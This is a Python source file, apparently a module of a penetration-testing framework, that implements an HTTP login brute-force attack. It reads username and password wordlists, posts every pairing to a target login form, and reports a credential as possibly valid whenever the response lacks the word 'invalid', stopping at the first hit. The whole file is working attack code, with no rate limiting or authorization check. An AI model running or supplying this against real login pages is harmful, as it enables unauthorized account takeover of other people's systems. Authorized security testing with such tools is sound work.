import requests
from core.base_module import BaseModule


class HTTPLoginBruteforce(BaseModule):
    def __init__(self, url, user_field="username", pass_field="password"):
        super().__init__("HTTP Login Bruteforce")

        self.url = url
        self.user_field = user_field
        self.pass_field = pass_field

        self.users_file = "modules/bruteforce/wordlists/users.txt"
        self.passwords_file = "modules/bruteforce/wordlists/passwords.txt"

    def load_wordlist(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return []

    def run(self, data):
        results = []

        users = self.load_wordlist(self.users_file)
        passwords = self.load_wordlist(self.passwords_file)

        for user in users:
            for password in passwords:
                try:
                    payload = {
                        self.user_field: user,
                        self.pass_field: password
                    }

                    response = requests.post(self.url, data=payload, timeout=10)

                    # 🔥 lógica básica de detección (puedes adaptarla)
                    if "invalid" not in response.text.lower():
                        results.append({
                            "url": self.url,
                            "username": user,
                            "password": password,
                            "status": "possible valid"
                        })

                        print(f"[+] Posible credencial válida: {user}:{password}")

                        # opcional: parar al encontrar una
                        return results

                except Exception as e:
                    continue

        return results